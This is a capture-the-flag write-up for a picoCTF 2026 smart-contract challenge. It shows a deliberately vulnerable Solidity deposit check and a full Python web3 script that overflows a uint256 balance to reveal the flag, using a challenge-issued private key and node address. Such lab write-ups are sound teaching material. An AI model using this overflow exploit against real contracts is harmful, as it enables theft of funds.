Smart_Overflow

Name: Smart_Overflow
Description: Welcome! The contract tracks balances using uint256 math. It should be impossible to get the flag... Contract: here The eth chain is at: Eth node address: mysterious-sea.picoctf.net:49359 More details can be found at here. NOTE: this server can take up to 5 minutes to start up. Please be patient.
Author: OB
Tags: Medium, Blockchain, picoCTF 2026
Challenge from: picoCTF 2026
Files: IntOverflowBank.sol
Hints:
1. What happens when balances[msg.sender] becomes smaller after a deposit?
2. Look at the flag reveal condition carefully.
3. Why do attackers like integers?

Theory

According to the description, to get the flag we have to reveal it through some kind of overflow, then that way we can retrieve the flag, so for that we'll have to skip to the solution part to look at the contract and the details webpage we are given.

Solution

So if we look at this contract, so far it's not so bad! But if we look closely at this function:

balances[msg.sender] = balances[msg.sender] + amount;

emit Deposit(msg.sender, amount);
if (!revealed && balances[msg.sender] < amount) {
  revealed = true;
  emit FlagRevealed(flag);
}

It's very clear that this is an integer overflow challenge, because we check that the new balance is below amount even though we just added to amount. Now let's get our credentials from the details webpage:

Perfect! Now we can start doing our code, first we'll initialize Web3 to see that we can connect. Then we'll the functions we'll be using for this exploit code. Then we'll enter our credentials, and finally, send our contract and overflow the hell out of the server:

from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://mysterious-sea.picoctf.net:49359"))
print("is connec:", w3.is_connected())

ABI = [{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]

acct = w3.eth.account.from_key("0x4f07d2ee096795b9dc13be16a89fac3baf820731af1953b55fcc6958835f0faf")
contract = w3.eth.contract(address="0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9", abi=ABI)

print("\noverflowing")
tx1 = contract.functions.deposit(2**256 - 1).build_transaction({'from': acct.address, 'nonce': w3.eth.get_transaction_count(acct.address), 'gas': 200000})
w3.eth.send_raw_transaction(acct.sign_transaction(tx1).raw_transaction)

print("reveal flag")
tx2 = contract.functions.deposit(1).build_transaction({'from': acct.address, 'nonce': w3.eth.get_transaction_count(acct.address), 'gas': 200000})
w3.eth.send_raw_transaction(acct.sign_transaction(tx2).raw_transaction)

print("\ntake flag")
print(contract.functions.getFlag().call())
